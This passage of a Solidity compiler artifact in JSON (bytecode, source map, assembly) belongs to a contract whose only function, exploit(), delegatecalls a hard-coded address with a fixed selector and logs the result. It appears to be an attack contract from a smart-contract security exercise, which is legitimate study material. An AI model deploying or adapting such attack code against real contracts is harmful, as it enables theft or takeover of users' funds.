							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xDD365B8B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x104 SWAP2 SWAP1 PUSH2 0x1F7 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13F JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x144 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP PUSH32 0x13848C3E38F8886F3F5D2AD9DFF80D8092C2BBB8EFD5B887A99C2C6CFC09AC2A DUP3 DUP3 PUSH1 0x40 MLOAD PUSH2 0x17A SWAP3 SWAP2 SWAP1 PUSH2 0x284 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1BA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x19F JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D1 DUP3 PUSH2 0x186 JUMP JUMPDEST PUSH2 0x1DB DUP2 DUP6 PUSH2 0x191 JUMP JUMPDEST SWAP4 POP PUSH2 0x1EB DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x19C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x203 DUP3 DUP5 PUSH2 0x1C6 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x223 DUP2 PUSH2 0x20E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x256 DUP3 PUSH2 0x186 JUMP JUMPDEST PUSH2 0x260 DUP2 DUP6 PUSH2 0x229 JUMP JUMPDEST SWAP4 POP PUSH2 0x270 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x19C JUMP JUMPDEST PUSH2 0x279 DUP2 PUSH2 0x23A JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x299 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x21A JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x20 DUP4 ADD MSTORE PUSH2 0x2AB DUP2 DUP5 PUSH2 0x24B JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 RETURN ADD 0xCB 0xAB SWAP8 EXP MUL BLOCKHASH 0xC8 SWAP6 NOT SHL COINBASE 0xE8 DIV 0x27 0xEA SWAP16 CALL PUSH9 0xE4F556F95880807C74 DUP9 LOG4 PUSH14 0x64736F6C63430008110033000000 ",
							"sourceMap": "564:660:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;892:329;;;:::i;:::-;;;1061:12;1075:17;1104:18;;;;;;;;;;1096:40;;1137:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1096:74;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1060:110;;;;1190:23;1199:7;1208:4;1190:23;;;;;;;:::i;:::-;;;;;;;;918:303;;892:329::o;7:98:1:-;58:6;92:5;86:12;76:22;;7:98;;;:::o;111:147::-;212:11;249:3;234:18;;111:147;;;;:::o;264:246::-;345:1;355:113;369:6;366:1;363:13;355:113;;;454:1;449:3;445:11;439:18;435:1;430:3;426:11;419:39;391:2;388:1;384:10;379:15;;355:113;;;502:1;493:6;488:3;484:16;477:27;326:184;264:246;;;:::o;516:386::-;620:3;648:38;680:5;648:38;:::i;:::-;702:88;783:6;778:3;702:88;:::i;:::-;695:95;;799:65;857:6;852:3;845:4;838:5;834:16;799:65;:::i;:::-;889:6;884:3;880:16;873:23;;624:278;516:386;;;;:::o;908:271::-;1038:3;1060:93;1149:3;1140:6;1060:93;:::i;:::-;1053:100;;1170:3;1163:10;;908:271;;;;:::o;1185:90::-;1219:7;1262:5;1255:13;1248:21;1237:32;;1185:90;;;:::o;1281:109::-;1362:21;1377:5;1362:21;:::i;:::-;1357:3;1350:34;1281:109;;:::o;1396:168::-;1479:11;1513:6;1508:3;1501:19;1553:4;1548:3;1544:14;1529:29;;1396:168;;;;:::o;1570:102::-;1611:6;1662:2;1658:7;1653:2;1646:5;1642:14;1638:28;1628:38;;1570:102;;;:::o;1678:373::-;1764:3;1792:38;1824:5;1792:38;:::i;:::-;1846:70;1909:6;1904:3;1846:70;:::i;:::-;1839:77;;1925:65;1983:6;1978:3;1971:4;1964:5;1960:16;1925:65;:::i;:::-;2015:29;2037:6;2015:29;:::i;:::-;2010:3;2006:39;1999:46;;1768:283;1678:373;;;;:::o;2057:407::-;2190:4;2228:2;2217:9;2213:18;2205:26;;2241:65;2303:1;2292:9;2288:17;2279:6;2241:65;:::i;:::-;2353:9;2347:4;2343:20;2338:2;2327:9;2323:18;2316:48;2381:76;2452:4;2443:6;2381:76;:::i;:::-;2373:84;;2057:407;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "149200",
								"executionCost": "24463",
								"totalCost": "173663"
							},
							"external": {
								"exploit()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 840,
									"end": 882,
									"name": "PUSH",
									"source": 0,
									"value": "F8E81D47203A594245E36C48E151709F0C19FBE8"
								},
								{
									"begin": 797,
									"end": 883,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 797,
									"end": 883,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 797,
									"end": 883,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 797,
									"end": 883,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 797,
									"end": 883,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 797,
									"end": 883,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 564,
									"end": 1224,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f301cbab970a0240c895191b41e80427ea9ff168e4f556f95880807c7488a46d64736f6c63430008110033",
									".code": [
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "63D9B770"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 564,
											"end": 1224,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 892,
											"end": 1221,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 892,
											"end": 1221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1061,
											"end": 1073,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1075,
											"end": 1092,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1104,
											"end": 1122,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1136,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1096,
											"end": 1136,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "DD365B8B00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1169,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1096,
											"end": 1170,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1096,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1060,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1060,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1060,
											"end": 1170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1060,
											"end": 1170,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "PUSH",
											"source": 0,
											"value": "13848C3E38F8886F3F5D2AD9DFF80D8092C2BBB8EFD5B887A99C2C6CFC09AC2A"
										},
										{
											"begin": 1199,
											"end": 1206,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1208,
											"end": 1212,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1190,
											"end": 1213,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1190,
											"end": 1213,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 918,
											"end": 1221,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 918,
											"end": 1221,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 892,
											"end": 1221,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 105,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
